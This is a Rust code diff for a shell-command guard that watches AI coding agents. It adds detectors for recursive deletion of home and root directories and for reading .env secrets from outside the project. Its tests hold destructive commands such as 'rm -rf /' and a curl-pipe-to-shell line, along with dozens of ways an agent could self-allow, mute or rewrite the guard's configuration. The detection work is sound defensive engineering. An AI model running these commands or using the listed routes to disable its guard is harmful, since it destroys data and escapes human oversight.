+/// a glob (`/*`, `/.*`, `/**`, `/.?*`, `/[!.]*`, `/{*,.*}`, see
+/// [`is_glob_only_component`]). `~/*` and `~/` are `~`; `/home/u/proj/build`
+/// and `~/*.log` are unchanged.
+fn rm_target_base(target: &str) -> &str {
+    let mut base = target;
+    loop {
+        let next = base
+            .strip_suffix("/.")
+            .or_else(|| base.strip_suffix('/'))
+            .or_else(|| {
+                let (parent, last) = base.rsplit_once('/')?;
+                is_glob_only_component(last).then_some(parent)
+            })
+            .filter(|rest| !rest.is_empty());
+        match next {
+            Some(rest) => base = rest,
+            None => return base,
+        }
+    }
+}
+
+/// A path component that names nothing of its own and matches (nearly) every
+/// entry of its directory: a glob made only of `*`, `?`, bracket expressions,
+/// dots and brace lists of those. `*`, `.*`, `.?*`, `[!.]*`, `[a-z]*` and
+/// `{*,.*}` are; `*.log`, `build*` and `.cache` are not.
+fn is_glob_only_component(component: &str) -> bool {
+    let mut has_glob = false;
+    let mut in_bracket = false;
+    for c in component.chars() {
+        if in_bracket {
+            in_bracket = c != ']';
+            continue;
+        }
+        match c {
+            '[' => {
+                in_bracket = true;
+                has_glob = true;
+            }
+            '*' | '?' => has_glob = true,
+            '.' | '{' | '}' | ',' => {}
+            _ => return false,
+        }
+    }
+    has_glob && !in_bracket
+}
+
+/// A single `rm` target that is a home directory itself, or all of its
+/// contents: `~`, `~/`, `~/*`, `~user`, `$HOME`, `${HOME}` (folded to `$HOME`
+/// by the caller), `$HOME/*`, `/root`, `/home/<user>`, `/Users/<user>`, and a
+/// `..` that climbs out of a home (`~/..`). A path UNDER a home
+/// (`~/.cache/build`, `$HOME/x`, `/home/u/proj/build`) is scoped work and never
+/// matches: only the home itself or everything in it does.
+///
+/// Case-insensitive, because the caller may hand over a lowercased command.
+fn rm_target_is_home(target: &str) -> bool {
+    let lower = target.to_ascii_lowercase();
+    // A home named by the shell (`~`, `$HOME`) is placed at a stand-in path so
+    // the same exact-path test, and the same `..` collapse, apply to it.
+    const STAND_IN: &str = "/home/~";
+    let placed = if lower == "~" || lower.starts_with("~/") {
+        format!("{STAND_IN}{}", &lower[1..])
+    } else if lower == "$home" || lower.starts_with("$home/") {
+        format!("{STAND_IN}{}", &lower["$home".len()..])
+    } else if let Some(user) = lower.strip_prefix('~') {
+        // `~user` (and `~user/`, `~user/*`), never `~+` / `~-`, which name the
+        // working directories rather than a home.
+        let name = rm_target_base(user);
+        return !name.is_empty()
+            && !name.contains('/')
+            && !name.starts_with(['+', '-'])
+            && name
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c));
+    } else if lower.starts_with('/') {
+        lower.clone()
+    } else {
+        return false;
+    };
+    let collapsed = collapse_path(&placed);
+    // `~/..` and `/home/u/..` climb out of a home into `/home` or `/`.
+    if placed != collapsed && rm_target_is_root_or_system(&collapsed) {
+        return true;
+    }
+    is_home_path(rm_target_base(&collapsed))
+}
+
+/// `/root`, `/home/<user>` or `/Users/<user>` itself (lowercase), not a path
+/// under one.
+fn is_home_path(path: &str) -> bool {
+    let parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
+    match parts.as_slice() {
+        ["root"] => path.starts_with('/'),
+        ["home" | "users", user] => {
+            path.starts_with('/') && !user.is_empty() && *user != "." && *user != ".."
+        }
+        _ => false,
+    }
 }
 
 /// Bodies of command substitutions (`$(...)`, `` `...` ``, `<(...)`, `>(...)`).
@@ -2152,6 +2916,304 @@ pub fn destructive_rm_root(hay: &str) -> bool {
         .into_iter()
         .flat_map(shell_command_segments)
         .any(segment_is_root_wipe)
+}
+
+/// Recursive, forced `rm` of a home directory itself or all of its contents:
+/// `~`, `~/*`, `~user`, `$HOME`, `${HOME}`, `"$HOME"`, `$HOME/*`, `/root`,
+/// `/home/<user>`, `/Users/<user>`. Correlated to one `rm` per segment and
+/// substitution body, exactly as [`destructive_rm_root`] is.
+///
+/// Only the home itself: `rm -rf ~/.cache/build`, `rm -rf "$HOME/.cache/x"`
+/// and `rm -rf /home/u/proj/build` are scoped cleanups and never match.
+pub fn destructive_rm_home(hay: &str) -> bool {
+    shell_command_segments(hay)
+        .into_iter()
+        .any(segment_is_home_wipe)
+        || substitution_bodies(hay)
+            .into_iter()
+            .flat_map(shell_command_segments)
+            .any(segment_is_home_wipe)
+}
+
+/// Recursive, forced `rm` whose operand, resolved from the directory the
+/// command runs in, is the filesystem root, a top-level system directory, a
+/// home directory, or all of the contents of one: `rm -rf *`, `rm -rf .`,
+/// `rm -rf ./*` and `rm -rf ..` run from the home or from `/`.
+///
+/// Every operand is resolved the way the shell would: `cd` earlier in the same
+/// command moves the directory (`cd build && rm -rf ./*` is a scoped cleanup),
+/// `~` and `$HOME` are `home`, and a relative path joins the directory. An
+/// operand the text cannot resolve (an unknown variable, a substitution, a
+/// `cd` to somewhere it cannot name) is left to the verdict the command gets
+/// without a directory, never guessed.
+pub fn destructive_rm_in_place(hay: &str, cwd: &str, home: Option<&str>) -> bool {
+    let wipes = |segments: Vec<&str>| {
+        let mut place = CommandPlace::new(cwd, home);
+        segments.into_iter().any(|segment| {
+            if place.step(segment).is_none() {
+                return false;
+            }
+            let Some(rm) = segment_rm_invocation(segment) else {
+                return false;
+            };
+            rm.recursive_force
+                && rm.targets.iter().any(|target| {
+                    place
+                        .resolve(target)
+                        .is_some_and(|path| path_is_wipe_target(&path, home))
+                })
+        })
+    };
+    wipes(shell_command_segments(hay))
+        || substitution_bodies(hay)
+            .into_iter()
+            .any(|body| wipes(shell_command_segments(body)))
+}
+
+/// A resolved absolute path whose removal wipes the root, a system directory,
+/// a home, or everything in one of them.
+fn path_is_wipe_target(path: &str, home: Option<&str>) -> bool {
+    let lower = path.to_ascii_lowercase();
+    rm_target_is_root_or_system(&lower)
+        || is_home_path(rm_target_base(&lower))
+        || home.is_some_and(|home| rm_target_base(path) == rm_target_base(home))
+}
+
+/// The first `.env`-class secrets file (`.env`, `.env.local`, `secret.env`;
+/// never a committed template such as `.env.example`) that a command reads
+/// from OUTSIDE the project, resolved from `cwd`. The project is
+/// `project_roots`: the root first (the repository, or the directory itself
+/// with none), then the checkouts it belongs to (a worktree's main checkout,
+/// a submodule's superproject).
+///
+/// A project's own `.env` is ordinary work, including `cat ../.env` from a
+/// subdirectory of the same repository and `cp ../../.env .` from a worktree
+/// inside its main checkout. One elsewhere (`cat ~/secret.env`, `cat
+/// /srv/other/.env`) belongs to something the agent was not asked to work on.
+///
+/// With no repository, a file directly in one of `enclosing_dirs` (the
+/// directories above `cwd`, below the home) is the project's too: a project
+/// not under git, opened in a subdirectory, keeps its `.env` one level up.
+///
+/// A root that is `/` or the home itself says nothing about the work (every
+/// file would be inside it, or none would), so nothing is reported from
+/// there: the read keeps the verdict it has without a directory.
+///
+/// Paths are resolved the way [`destructive_rm_in_place`] resolves them, and a
+/// path the text cannot resolve is not reported either. A path that exists is
+/// also compared by where it really is, so a symlinked spelling of the
+/// project (`/tmp` for `/private/tmp`) is still the project.
+pub fn env_read_outside_project(
+    content: &str,
+    cwd: &str,
+    home: Option<&str>,
+    project_roots: &[&str],
+    enclosing_dirs: &[&str],
+) -> Option<String> {
+    let roots: Vec<&str> = project_roots
+        .iter()
+        .map(|root| root.trim_end_matches('/'))
+        .collect();
+    let root = *roots.first()?;
+    if root.is_empty() || home.is_some_and(|home| root == home.trim_end_matches('/')) {
+        return None;
+    }
+    let under = |path: &str, root: &str| {
+        !root.is_empty() && (path == root || path.starts_with(&format!("{root}/")))
+    };
+    let canonical = |path: &str| {
+        std::fs::canonicalize(path)
+            .ok()
+            .map(|p| p.to_string_lossy().into_owned())
+    };
+    let inside = |path: &str| {
+        roots.iter().any(|root| under(path, root))
+            || path
+                .rsplit_once('/')
+                .is_some_and(|(dir, _)| enclosing_dirs.contains(&dir))
+            || canonical(path).is_some_and(|real| {
+                roots
+                    .iter()
+                    .filter_map(|root| canonical(root))
+                    .any(|root| under(&real, &root))
+            })
+    };
+    let content = strip_inert_heredoc_bodies(content);
+    let mut place = CommandPlace::new(cwd, home);
+    for segment in shell_command_segments(&content) {
+        let Some(words) = place.step(segment) else {
+            continue;
+        };
+        if check_sensitive_read(segment).is_none() {
+            continue;
+        }
+        for word in &words {
+            // An operand can sit inside a larger word: `--env-file=/x/.env`,
+            // `curl -F f=@/x/.env`, `open('/x/.env')`.
+            for piece in word.split(['=', '@', '(', ')', ',', '\'', '"', '<', '>']) {
+                if check_sensitive_path(piece) != Some(".env") {
+                    continue;
+                }
+                if let Some(path) = place.resolve(piece) {
+                    if !inside(&path) {
+                        return Some(path);
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+
+/// The directory a command list is at, segment by segment: what `cd` moves it
+/// to, and the variables assigned literally along the way. Pure text; nothing
+/// is read from the filesystem or the environment.
+struct CommandPlace<'a> {
+    cwd: Option<String>,
+    home: Option<&'a str>,
+    variables: std::collections::HashMap<String, String>,
+    /// The directory outside each subshell the list is in: a `cd` inside
+    /// `( ... )` or `$( ... )` ends with it.
+    outside: Vec<Option<String>>,
+    /// Subshells the last segment closed, left once that segment is judged.
+    closing: usize,
+}
+
+impl<'a> CommandPlace<'a> {
+    fn new(cwd: &str, home: Option<&'a str>) -> Self {
+        Self {
+            cwd: cwd.starts_with('/').then(|| collapse_path(cwd)),
+            home: home.filter(|home| home.starts_with('/')),
+            variables: std::collections::HashMap::new(),
+            outside: Vec::new(),
+            closing: 0,
+        }
+    }
+
+    /// Advance over one segment. A directory change moves the place and
+    /// returns `None` (it removes nothing and reads nothing); any other
+    /// segment returns its words, `${HOME}` and `${PWD}` folded so the
+    /// tokenizer keeps them whole. The segment is judged inside any subshell
+    /// it opens or closes; the place goes back out after it.
+    fn step(&mut self, segment: &str) -> Option<Vec<String>> {
+        for _ in 0..std::mem::take(&mut self.closing) {
+            if let Some(outside) = self.outside.pop() {
+                self.cwd = outside;
+            }
+        }
+        let (opens, closes) = unquoted_parentheses(segment);
+        for _ in 0..opens {
+            self.outside.push(self.cwd.clone());
+        }
+        self.closing = closes;
+        self.step_inside(segment)
+    }
+
+    /// [`Self::step`] once the subshells are accounted for.
+    fn step_inside(&mut self, segment: &str) -> Option<Vec<String>> {
+        let words = shell_tokens(&fold_braced_names(segment));
+        record_literal_assignments(&words, &mut self.variables);
+        let Some(index) = effective_command_index(&words) else {
+            return Some(words);
+        };
+        let command = token_basename(&words[index]).to_ascii_lowercase();
+        match command.as_str() {
+            "cd" | "pushd" => {
+                let operand = words[index + 1..]
+                    .iter()
+                    .find(|word| !word.starts_with('-') || word.as_str() == "-");
+                self.cwd = match operand.map(String::as_str) {
+                    // `cd` alone goes home.
+                    None => self.home.map(collapse_path),
+                    // `cd -` goes back somewhere this text does not say.
+                    Some("-") => None,
+                    Some(operand) => self.resolve(operand),
+                };
+                None
+            }
+            "popd" => {
+                self.cwd = None;
+                None
+            }
+            _ => Some(words),
+        }
+    }
+
+    /// Resolve one operand to an absolute, collapsed path, or `None` when the
+    /// shell would need something the text does not say.
+    fn resolve(&self, operand: &str) -> Option<String> {
+        let operand = expand_literal_path(&fold_braced_names(operand), &self.variables);
+        let operand = operand.trim_matches(['\'', '"']);
+        let after = |prefix: &str| {
+            operand
+                .strip_prefix(prefix)
+                .filter(|rest| rest.is_empty() || rest.starts_with('/'))
+        };
+        let joined = if let Some(rest) = after("~").or_else(|| after("$HOME")) {
+            format!("{}{rest}", self.home?)
+        } else if let Some(rest) = after("~+").or_else(|| after("$PWD")) {
+            format!("{}{rest}", self.cwd.as_deref()?)
+        } else if operand.starts_with('~') {
+            // `~user`, `~-`: a directory this text does not name.
+            return None;
+        } else if operand.starts_with('/') {
+            operand.to_owned()
+        } else {
+            format!("{}/{operand}", self.cwd.as_deref()?)
+        };
+        if joined.contains(['$', '`']) {
+            return None;
+        }
+        Some(collapse_path(&joined))
+    }
+}
+
+/// How many `(` and `)` a segment holds outside quotes: a subshell or a
+/// substitution opening and closing.
+fn unquoted_parentheses(segment: &str) -> (usize, usize) {
+    let (mut opens, mut closes) = (0, 0);
+    let (mut single, mut double, mut escaped) = (false, false, false);
+    for c in segment.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match c {
+            '\\' if !single => escaped = true,
+            '\'' if !double => single = !single,
+            '"' if !single => double = !double,
+            '(' if !single && !double => opens += 1,
+            ')' if !single && !double => closes += 1,
+            _ => {}
+        }
+    }
+    (opens, closes)
+}
+
+/// A parameter expansion of the home variable with an operator
+/// (`${HOME:-/x}`, `${HOME%/}`, `${HOME:?}`, `${HOME#/}`) as `$HOME`, for the
+/// `rm` target checks. Each is the home itself or something the text cannot
+/// settle, never a scoped path, so the home is assumed. Either case, because
+/// the caller may hand over a lowercased command.
+fn fold_home_expansions(text: &str) -> std::borrow::Cow<'_, str> {
+    static EXPANSION: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    if !text.contains("${") {
+        return std::borrow::Cow::Borrowed(text);
+    }
+    EXPANSION
+        .get_or_init(|| {
+            regex::Regex::new(r"\$\{(?:HOME|home)[:%#/^,@][^}]*\}")
+                .expect("static home-expansion regex")
+        })
+        .replace_all(text, "$$HOME")
+}
+
+/// `${HOME}` and `${PWD}` as `$HOME` and `$PWD`. The tokenizer splits an
+/// unquoted brace, which would leave `$` and the name as two words.
+fn fold_braced_names(text: &str) -> String {
+    text.replace("${HOME}", "$HOME")
+        .replace("${home}", "$home")
+        .replace("${PWD}", "$PWD")
 }
 
 /// A byte that continues a path token. A sensitive pattern flanked by these is a
@@ -8125,7 +9187,91 @@ mod tests {
         // Never hangs / overflows on a deeply-nested or huge input.
         let big = "$(".repeat(5000) + "rm -rf /" + &")".repeat(5000);
         let out = normalize_command(&big);
-        assert!(out.len() <= 8192);
+        // Every piece is rewritten and kept, so the output tracks the input:
+        // never more than the input plus one overlap and a newline per piece.
+        let pieces = big.len() / (NORMALIZE_BLOCK_BYTES - NORMALIZE_BLOCK_OVERLAP) + 1;
+        assert!(out.len() <= big.len() + pieces * (NORMALIZE_BLOCK_OVERLAP + 1));
+        // A megabyte of the same nesting still finishes, in work linear in its size.
+        let huge = "$(".repeat(250_000) + "rm -rf /" + &")".repeat(250_000);
+        assert!(normalize_command(&huge).contains("rm -rf /"));
+    }
+
+    /// FAILS ON REVERT (byte cut): a character of every UTF-8 width placed
+    /// across every offset near the piece limit. The cut used to land inside
+    /// it and panic; now nothing panics and what follows is still rewritten.
+    #[test]
+    fn normalize_command_never_cuts_inside_a_character() {
+        for wide in ['\u{e9}', '\u{20ac}', '\u{1f600}'] {
+            for lead in NORMALIZE_BLOCK_BYTES - 8..=NORMALIZE_BLOCK_BYTES + 4 {
+                for separator in ["", "; "] {
+                    let command = format!("{}{wide}{separator}${{x:-rm}} -rf /", "a".repeat(lead));
+                    let out = normalize_command(&command);
+                    assert!(
+                        out.contains("rm -rf /"),
+                        "lead {lead} {wide:?} {separator:?}"
+                    );
+                }
+            }
+        }
+    }
+
+    /// FAILS ON REVERT (byte cut): the end of a long command is rewritten, not
+    /// dropped. And a long command with nothing to rewrite comes back
+    /// unchanged, byte for byte, so checks that parse it see the same structure.
+    #[test]
+    fn normalize_command_keeps_the_end_of_a_long_command() {
+        let padding = "a".repeat(3 * NORMALIZE_BLOCK_BYTES);
+        let out = normalize_command(&format!("echo {padding}; ${{x:-rm}} -rf /"));
+        assert!(out.ends_with("; rm -rf /"), "{}", &out[out.len() - 40..]);
+
+        let mut script = String::new();
+        while script.len() < 3 * NORMALIZE_BLOCK_BYTES {
+            script.push_str("if [ -d ./build ]; then make -C ./build all | tee build.log; fi\n");
+        }
+        assert_eq!(normalize_command(&script), script);
+    }
+
+    /// A single command longer than a piece, with no separator to cut at, is
+    /// cut with an overlap: an obfuscated word straddling any cut position is
+    /// still rewritten whole in one of the two pieces.
+    #[test]
+    fn normalize_command_overlaps_a_cut_without_a_separator() {
+        let word = "${x:-rm} -rf /";
+        for lead in NORMALIZE_BLOCK_BYTES - word.len() - 2..=NORMALIZE_BLOCK_BYTES + 2 {
+            let command = format!("echo $({} {word})", "a".repeat(lead));
+            assert!(
+                normalize_command(&command).contains("rm -rf /"),
+                "lead {lead}"
+            );
+        }
+    }
+
+    /// FAILS ON REVERT (overlap started mid-word, on a line of its own): a
+    /// forced cut repeated the tail of `confirm` as `rm -rf /` at the start
+    /// of a new line, a root wipe the command never ran. The repeated text
+    /// starts at a word and stays part of the same command.
+    #[test]
+    fn normalize_command_overlap_never_invents_a_command() {
+        // "echo " + padding + " confirm": the old overlap start, 1024 bytes
+        // before the cut, lands on the `rm` inside `confirm`.
+        let lead = NORMALIZE_BLOCK_BYTES - NORMALIZE_BLOCK_OVERLAP - "echo ".len() - " confi".len();
+        let command = format!(
+            "echo {} confirm -rf / {}",
+            "a".repeat(lead),
+            "b".repeat(2000)
+        );
+        assert_eq!(
+            command.find("rm -rf"),
+            Some(NORMALIZE_BLOCK_BYTES - NORMALIZE_BLOCK_OVERLAP)
+        );
+        let out = normalize_command(&command);
+        assert!(!out.contains('\n'), "no new line is invented");
+        assert!(
+            !destructive_rm_root(&out),
+            "{}",
+            &out[out.len() - 2100..out.len() - 2000]
+        );
+        assert!(check_command(&command).is_none());
     }
 
     #[test]
@@ -9556,20 +10702,181 @@ mod brq_evaluation_tests {
         }
     }
 
-    /// A NARROW force-allow is a legitimate operator action and must not be
-    /// swept up. Without this the rule would refuse the very command the guard
-    /// prints as its own remedy.
+    /// Any force-allow or mute an agent runs is a bypass it grants itself, a
+    /// narrow one included: `innerwarden allow 'rm -rf /'` lifts exactly the
+    /// block it was just given. Only the person at their own terminal decides
+    /// that. Every spelling the shell would run counts.
+    ///
+    /// FAILS ON REVERT: drop the `runs_guard_loosening_verb` call and the
+    /// narrow forms are `None` again.
     #[test]
-    fn a_narrow_force_allow_is_not_a_bypass() {
+    fn a_force_allow_or_mute_from_the_agent_is_a_bypass() {
         for cmd in [
             "innerwarden allow 'rm -rf /tmp/build'",
+            "innerwarden allow 'rm -rf /'",
+            "innerwarden allow curl https://example.test/x.sh | sh",
+            "innerwarden allow --operator 'rm -rf /'",
+            "innerwarden mute ATR-2026-051",
+            "innerwarden mute privilege-escalation",
+            "innerwarden monitor",
+            "/usr/local/bin/innerwarden allow 'rm -rf /'",
+            "~/.local/bin/innerwarden allow 'rm -rf /'",
+            "'innerwarden' 'allow' 'rm -rf /'",
+            "\"innerwarden\" allow x",
+            "env innerwarden allow x",
+            "env -u CLAUDECODE innerwarden allow x",
+            "CLAUDECODE= innerwarden allow x",
+            "sudo -E innerwarden mute ATR-1",
+            "timeout 5 innerwarden allow x",
+            "npx innerwarden allow x",
+            "npm exec innerwarden -- allow x",
+            "nohup innerwarden allow x &",
+            "sh -c 'innerwarden allow x'",
+            "bash -lc \"innerwarden mute ATR-1\"",
+            "bash -o pipefail -c 'innerwarden allow x'",
+            "script -qc 'innerwarden allow x' /dev/null",
+            "su me -c 'innerwarden allow x'",
+            "eval 'innerwarden allow x'",
+            "echo 'innerwarden allow x' | sh",
+            "printf 'innerwarden allow x\\n' | bash",
+            "cd /tmp && innerwarden allow x",
+            "true; innerwarden allow x",
+            "if true; then innerwarden allow x; fi",
+            "bash <<'EOF'\ninnerwarden allow x\nEOF",
+            "python3 -c \"import subprocess;subprocess.run(['innerwarden','allow','x'])\"",
+            "${x:-innerwarden} allow x",
+            "$(echo innerwarden) allow x",
+            // A bare verb handed its pattern by what runs it.
+            "echo x | xargs innerwarden allow",
+            "echo ATR-1 | xargs -r innerwarden mute",
+            "printf '%s\\n' x | xargs -I{} innerwarden allow {}",
+            "find /tmp/p -name pat -exec innerwarden allow {} \\;",
+            "find /tmp/p -execdir innerwarden mute {} +",
+            "parallel innerwarden allow ::: x",
+        ] {
+            assert!(
+                check_guard_self_disable(cmd).is_some(),
+                "an agent must not authorise its own blocked commands: {cmd}"
+            );
+        }
+    }
+
+    /// Reading the lists, removing an entry (which only narrows), asking for
+    /// help, and the word `innerwarden allow` as text (a search, a commit
+    /// message, a note) are not a bypass, and must keep running.
+    #[test]
+    fn reading_the_allow_list_or_naming_the_verb_is_not_a_bypass() {
+        for cmd in [
+            "innerwarden allow",
             "innerwarden allow --list",
             "innerwarden allow --remove 'ls -la'",
+            "innerwarden allow --help",
             "innerwarden status",
+            "innerwarden check 'rm -rf /'",
+            "grep -rn 'innerwarden allow' docs/",
+            "rg \"innerwarden allow\" crates/",
+            "git commit -m 'innerwarden allow: refuse without a terminal'",
+            "echo 'run innerwarden allow yourself'",
+            "cargo test -p innerwarden-agent-guard -- allow",
+            "which innerwarden",
+            "sh ./scripts/innerwarden-allow-test.sh",
+            "echo x | xargs innerwarden allow --list",
+            "find docs -name '*.md' -exec grep -l 'innerwarden allow' {} +",
+            "find . -name '*.toml' -exec cat {} \\;",
         ] {
             assert!(
                 check_guard_self_disable(cmd).is_none(),
-                "authorising one command is not disabling the guard: {cmd}"
+                "reading or naming the verb is not running it: {cmd}"
+            );
+        }
+    }
+
+    /// A write into the guard's own configuration directory is the same
+    /// bypass by another route: `allow = ["*"]` in its allow file switches
+    /// the guard off without running the guard at all.
+    ///
+    /// FAILS ON REVERT: drop the `writes_guard_config` call and these are
+    /// `None`.
+    #[test]
+    fn a_shell_write_into_the_guard_config_is_a_bypass() {
+        for cmd in [
+            "printf 'allow=[\"*\"]' > ~/.config/innerwarden/suppress.toml",
+            "printf 'allow = [\"*\"]' > ~/.config/innerwarden/suppress.toml",
+            "echo 'allow=[\"*\"]' >> ~/.config/innerwarden/suppress.toml",
+            "echo x > $HOME/.config/innerwarden/suppress.toml",
+            "echo x > \"$HOME/.config/innerwarden/suppress.toml\"",
+            "echo x > ${HOME}/.config/innerwarden/suppress.toml",
+            "echo x > $XDG_CONFIG_HOME/innerwarden/suppress.toml",
+            "echo x > /home/dev/.config/innerwarden/suppress.toml",
+            "echo x > /Users/dev/.config/innerwarden/agents.toml",
+            "echo x>~/.config/innerwarden/suppress.toml",
+            "echo x > ~/.config//innerwarden/./suppress.toml",
+            "echo x > ~/.config/inner''warden/suppress.toml",
+            "cat > ~/.config/innerwarden/suppress.toml <<'EOF'\nallow = [\"*\"]\nEOF",
+            "echo 'allow=[\"*\"]' | tee ~/.config/innerwarden/suppress.toml",
+            "echo x | tee -a ~/.config/innerwarden/suppress.toml >/dev/null",
+            "cp /tmp/s.toml ~/.config/innerwarden/suppress.toml",
+            "cp -t ~/.config/innerwarden /tmp/suppress.toml",
+            "install -m 644 /tmp/s.toml ~/.config/innerwarden/suppress.toml",
+            "ln -sf /tmp/s.toml ~/.config/innerwarden/suppress.toml",
+            "mv /tmp/s.toml ~/.config/innerwarden/suppress.toml",
+            "mv ~/.config/innerwarden/agents.toml /tmp/",
+            "rm -f ~/.config/innerwarden/agents.toml",
+            "rm -rf ~/.config/innerwarden",
+            "truncate -s 0 ~/.config/innerwarden/guard-events.jsonl",
+            "sed -i 's/^allow.*/allow=[\"*\"]/' ~/.config/innerwarden/suppress.toml",
+            "sed -i.bak 's/a/b/' ~/.config/innerwarden/suppress.toml",
+            "perl -pi -e 's/a/b/' ~/.config/innerwarden/suppress.toml",
+            "dd if=/tmp/s of=/home/dev/.config/innerwarden/suppress.toml",
+            "python3 -c \"open('/home/dev/.config/innerwarden/suppress.toml','w').write('allow=[\\\"*\\\"]')\"",
+            "python3 -c \"import os;open(os.path.expanduser('~/.config/innerwarden/suppress.toml'),'a').write('x')\"",
+            "python3 -c \"import pathlib;(pathlib.Path.home()/'.config'/'innerwarden'/'suppress.toml').write_text('x')\"",
+            "node -e \"require('fs').writeFileSync(process.env.HOME+'/.config/innerwarden/suppress.toml','x')\"",
+            "cd ~/.config/innerwarden && printf 'allow=[\"*\"]' > suppress.toml",
+            "cd ~/.config && echo x > innerwarden/suppress.toml",
+            "d=~/.config/innerwarden; echo x > $d/suppress.toml",
+            "D=\"$HOME/.config/innerwarden\" && cp /tmp/s ${D}/suppress.toml",
+            "sh -c \"echo x > ~/.config/innerwarden/suppress.toml\"",
+            // Relative to a `cd` above the directory, and through a link to it.
+            "cd ~ && echo x > .config/innerwarden/suppress.toml",
+            "cd && printf 'allow=[1]' > .config/innerwarden/suppress.toml",
+            "ln -s ~/.config/innerwarden /tmp/c && echo x > /tmp/c/suppress.toml",
+            "ln -sf $HOME/.config/innerwarden/suppress.toml ./s.toml; echo x >> s.toml",
+            "cd ~/.config && ln -s innerwarden /tmp/c",
+        ] {
+            assert!(
+                check_guard_self_disable(cmd).is_some(),
+                "a write into the guard's configuration disables it: {cmd}"
+            );
+        }
+    }
+
+    /// Reading the configuration, backing it up elsewhere, and writes that only
+    /// pass near it are ordinary work and keep running.
+    #[test]
+    fn reading_or_copying_out_the_guard_config_is_not_a_bypass() {
+        for cmd in [
+            "cat ~/.config/innerwarden/suppress.toml",
+            "ls -la ~/.config/innerwarden",
+            "tail -n 50 ~/.config/innerwarden/guard-events.jsonl",
+            "jq . ~/.config/innerwarden/graph.json > /tmp/graph.json",
+            "cat ~/.config/innerwarden/suppress.toml > /tmp/backup.toml",
+            "cat ~/.config/innerwarden/suppress.toml > $HOME/backup.toml",
+            "cp ~/.config/innerwarden/suppress.toml /tmp/backup.toml",
+            "cp -r ~/.config/innerwarden /tmp/iw-backup",
+            "grep -c allow ~/.config/innerwarden/suppress.toml 2>/dev/null",
+            "cd ~/.config/innerwarden && cat suppress.toml > /tmp/s",
+            "python3 -c \"import tomllib;print(tomllib.load(open('/home/dev/.config/innerwarden/suppress.toml','rb')))\"",
+            "echo x > ~/.config/innerwarden-notes/a.txt",
+            "cargo build -p innerwarden-cli > /tmp/build.log 2>&1",
+            "cp target/release/innerwarden /tmp/innerwarden-test",
+            "rm -rf ./build",
+            "ln -s ~/.config/nvim ./nvim-config",
+            "ln -sf target/release/innerwarden ~/.local/bin/innerwarden-dev",
+        ] {
+            assert!(
+                check_guard_self_disable(cmd).is_none(),
+                "reading the configuration is not writing it: {cmd}"
             );
         }
     }
